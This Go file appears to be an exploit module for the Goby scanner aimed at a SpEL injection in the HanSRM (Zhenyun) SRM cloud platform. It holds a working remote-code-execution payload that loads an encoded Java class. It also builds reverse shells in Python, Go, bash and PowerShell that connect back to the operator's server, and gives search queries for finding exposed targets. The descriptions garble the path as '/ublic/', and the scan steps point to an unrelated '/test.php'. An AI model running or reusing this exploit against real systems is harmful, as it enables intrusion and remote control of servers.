package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "HanSRM /oauth/public Command Execution Vulnerability",
    "Description": "<p>Zhenyun SRM Cloud Platform is a cloud platform developed by Shanghai Zhenyun Information Technology Co., Ltd. and designed for the digital transformation of enterprise procurement. The product focuses on enterprise procurement management, improves procurement efficiency, reduces procurement costs, and enhances the transparency and compliance of the supply chain through digital means. It is committed to providing enterprises with full procurement process management from demand to sourcing, orders to reconciliation and invoicing, covering all categories of enterprise procurement. Zhenyun SRM Platform has a SpEL expression injection vulnerability. The vulnerability stems from the system's ability to parse SpEL expressions in the /ublic/ post-path, allowing attackers to exploit the vulnerability to execute arbitrary code.</p>",
    "Product": "Han-SRM-Cloud-Platform-(Going-Link)",
    "Homepage": "https://zzmetro.going-link.com/",
    "DisclosureDate": "2024-08-16",
    "PostTime": "2024-11-01",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"汉得SRM云平台\" && (title=\"汉得SRM云平台\" || title=\"汉得SRM云平台(Going-Link)\") || body=\"/oauth/static/default/css/footer.css\"",
    "GobyQuery": "body=\"汉得SRM云平台\" && (title=\"汉得SRM云平台\" || title=\"汉得SRM云平台(Going-Link)\") || body=\"/oauth/static/default/css/footer.css\"",
    "Level": "3",
    "Impact": "<p>Zhenyun SRM Platform has a SpEL expression injection vulnerability. The vulnerability stems from the system's ability to parse SpEL expressions in the /ublic/ post-path, allowing attackers to exploit the vulnerability to execute arbitrary code.</p>",
    "Recommendation": "<p>1. Pay attention to the manufacturer information and update to the latest version in time: <a href=\"https://zzmetro.going-link.com/\">https://zzmetro.going-link.com/</a> </p><p> 2. Close the Internet exposure or interface setting access rights </p><p> 3. Upgrade to a safe version</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/141182186"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "HW-2024"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "汉得SRM /oauth/public 命令执行漏洞",
            "Product": "汉得SRM云平台(Going-Link)",
            "Description": "<p>甄云SRM云平台是由上海甄云信息科技有限公司开发的一款专为企业采购数字化转型而设计的云平台。该产品以企业采购管理为核心,通过数字化手段提升采购效率，降低采购成本，增强供应链的透明度和合规性。致力于为企业提供从需求到寻源、订单到对账开票的全采购流程管理，全面覆盖企业全品类采购。甄云SRM平台存在SpEL表达式注入漏洞，该漏洞源于系统能够解析/oauth/public后路径中的SpEL表达式，导致攻击者能够利用该漏洞执行任意代码。<br></p>",
            "Recommendation": "<p>1.关注厂商信息，及时更新到最新版本：<a href=\"https://zzmetro.going-link.com/\">https://zzmetro.going-link.com/</a></p><p>2.关闭互联网暴露面或接口设置访问权限&nbsp;</p><p>3.升级至安全版本</p>",
            "Impact": "<p>甄云SRM平台存在SpEL表达式注入漏洞，该漏洞源于系统能够解析/)ublic/后路径中的SpEL表达式，导致攻击者能够利用该漏洞执行任意代码。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "HanSRM /oauth/public Command Execution Vulnerability",
            "Product": "Han-SRM-Cloud-Platform-(Going-Link)",
            "Description": "<p>Zhenyun SRM Cloud Platform is a cloud platform developed by Shanghai Zhenyun Information Technology Co., Ltd. and designed for the digital transformation of enterprise procurement. The product focuses on enterprise procurement management, improves procurement efficiency, reduces procurement costs, and enhances the transparency and compliance of the supply chain through digital means. It is committed to providing enterprises with full procurement process management from demand to sourcing, orders to reconciliation and invoicing, covering all categories of enterprise procurement. Zhenyun SRM Platform has a SpEL expression injection vulnerability. The vulnerability stems from the system's ability to parse SpEL expressions in the /ublic/ post-path, allowing attackers to exploit the vulnerability to execute arbitrary code.<br></p>",
            "Recommendation": "<p>1. Pay attention to the manufacturer information and update to the latest version in time: <a href=\"https://zzmetro.going-link.com/\">https://zzmetro.going-link.com/</a>&nbsp;</p><p>&nbsp;2. Close the Internet exposure or interface setting access rights&nbsp;</p><p>&nbsp;3. Upgrade to a safe version<br></p>",
            "Impact": "<p>Zhenyun SRM Platform has a SpEL expression injection vulnerability. The vulnerability stems from the system's ability to parse SpEL expressions in the /ublic/ post-path, allowing attackers to exploit the vulnerability to execute arbitrary code.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	setPayloadRequestHashzsBjquOv := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		//漏洞url地址
		vulPath := "/oauth/public/"
		//将command进行base64加密
		commandBase64 := base64.StdEncoding.EncodeToString([]byte(command))
		getRequestConfig := httpclient.NewGetRequestConfig("/oauth/public/%5f%5f%24%7bT(groovy.lang.GroovyClassLoader).newInstance().defineClass('CALC',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADQAqwoAJABOCgBPAFAHAFEKAAMAUgoAAwBTCwBUAFUIAD8LAFYAVwcAWAoAWQBaCgBbAFwKAAkAXQgAXgoAXwBgCgAJAGEIAGIKAAkAYwgAZAgAZQgAZggAZwoAaABpCgBoAGoKAGsAbAcAbQoAGQBuCABvCgAZAHAKABkAcQoAGQByCABzCgB0AHUKAHQAdgoAdAB3BwB4BwB5AQAGPGluaXQ%2bAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAAR0aGlzAQAGTENBTEM7AQACc3IBAEJMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1NlcnZsZXRSZXF1ZXN0QXR0cmlidXRlczsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQALcHJpbnRXcml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAh1c2VybmFtZQEADVN0YWNrTWFwVGFibGUHAHgHAFEHAHoHAHsHAHwHAFgHAC8HAH0HAG0BAApFeGNlcHRpb25zBwB%2bAQAKU291cmNlRmlsZQEACUNBTEMuamF2YQwAJQAmBwBxxxxDACAAIEBAEBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzDACCAIMMAIQAhQcAewwAhgCHBwB6DACIAIkBABBqYXZhL2xhbmcvU3RyaW5nBwCKDACLAI4HAI8MAJAAkQwAJQCSAQAHb3MubmFtZQcAkwwAlACJDACVAJYBAAN3aW4MAJcAmAEAAnNoAQACLWMBAAdjbWQuZXhlAQACL2MHAJkMAJoAmwwAnACdBwCeDACfAKABABFqYXZhL3V0aWwvU2Nhbm5lcgwAJQChAQACXGEMAKIAowwApAClDACmAJYBAAAHAHwMAKcAqAwAqQAmDACqACYBAARDQUxDAQAQamF2YS9sYW5nL09iamVjdAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEACmdldFJlcXVlc3QBACkoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAC2dldFJlc3BvbnNlAQAqKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAFKFtCKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UAIQAjACQAAAAAAAEAAQAlACYAAgAnAAACGAAEAAwAAADZKrcAAbgAAsAAA0wrtgAETSu2AAVOLbkABgEAOgQsEge5AAgCADoFGQXGAKW7AAlZuAAKGQW2AAu3AAw6BQQ2BhINuAAOOgcZB8YAExkHtgAPEhC2ABGZAAYDNgYVBpkAGQa9AAlZAxISU1kEEhNTWQUZBVOnABYGvQAJWQMSFFNZBBIVU1kFGQVTOgi4ABYZCLYAF7YAGDoJuwAZWRkJtwAaEhu2ABw6ChkKtgAdmQALGQq2AB6nAAUSHzoLGQQZC7YAIBkEtgAhGQS2ACIZBLYAIRkEtgAisQAAAAMAKAAAAFoAFgAAAAwABAAOAAsADwAQABAAFQARAB0AEwAnABQALAAWAD0AGABAABkARwAaAFkAGwBcAB4AjAAfAJkAIACpACEAvQAiAMQAIwDJACQAzgAnANMAKADYACkAKQAAAHoADABAAI4AKgArAAYARwCHACwALQAHAIwAQgAuAC8ACACZADUAMAAxAAkAqQAlADIAMwAKAL0AEQA0AC0ACwAAANkANQA2AAAACwDOADcAOAABABAAyQA5ADoAAgAVAMQAOwA8AAMAHQC8AD0APgAEACcAsgAxxxxAC0ABQBAAAAATQAGxxxxwBcAAgHAEEHAEIHAEMHAEQHAEUHAEYBBwBGAAAaUgcARxxxx4ALgcARwcASAcASUEHAEbxxxxABIABgcAQQcAQgcAQwcARAcARQcARgAAAEoAAAAEAAEASwACAEwAAAACAE0AjQAAAAoAAQBbAFkAjAAJ'.replace('xxxx',new%20String(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('Lw=='))))).newInstance()-1%7d%5f%5f%3a%3a%78/ab?username=" + commandBase64 + "")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		// 请求头
		head := map[string]string{
			"User-Agent":      " Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
			"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "keep-alive",
		}
		for headName, headValue := range head {
			getRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil || response == nil {
			return "", "", err
		}

		return response.RawBody, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashzsBjquOv

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashzsBjquOv

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				ReverseTcpByPython := func(rp string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
				}
				ReverseTcpByGo := func(rp string) string {
					return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + godclient.GetGodServerHost() + ":" + rp + "\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPython":           ReverseTcpByPython,
					"ByGo":               ReverseTcpByGo,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
